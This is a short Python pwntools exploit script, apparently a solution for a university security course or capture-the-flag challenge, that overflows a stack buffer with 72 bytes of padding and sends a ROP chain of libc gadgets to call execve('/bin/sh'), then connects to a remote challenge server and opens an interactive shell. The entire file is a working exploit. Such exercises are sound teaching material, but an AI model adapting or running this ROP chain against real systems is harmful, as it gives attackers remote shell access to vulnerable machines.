from pwn import process, connect, p64

# vulnerable buffer: rbp - 0x40
# saved rip: rbp + 0x8
# padding: 0x40 + 0x8 = 72

# execve("/bin/sh")
# rax: 0x3b
# rdi: &"/bin/sh"
# rsi: 0
# rdx: 0

base = 0x7ffff7dd4000

def shell():
    # TODO for you: try to find this gadget by yourself using ROPgadget and
    # ropium!
    addr_binsh = 0x1b75aa
    pop_rax = 0x4a54f
    pop_rdi = 0x26b72
    pop_rsi = 0x27529
    mov_rdx_0 = 0x142071
    syscall = 0x2584d

    padding = b'a' * 72
    attack = padding + p64(base + pop_rdi) + p64(base + addr_binsh) + \
            p64(base + pop_rsi) + p64(0) + \
            p64(base + mov_rdx_0) + \
            p64(base + pop_rax) + p64(0x3b) + \
            p64(base + syscall)
    return attack

def main():
    p = process(["./ld-2.31.so", "./stack"], env = {"LD_PRELOAD": "./libc-2.31.so"})
    p = connect("asu-cse545.com", 6666)
    print(p.recvline())
    attack = shell()
    p.sendline(attack)
    p.interactive()


if __name__ == "__main__":
    main()
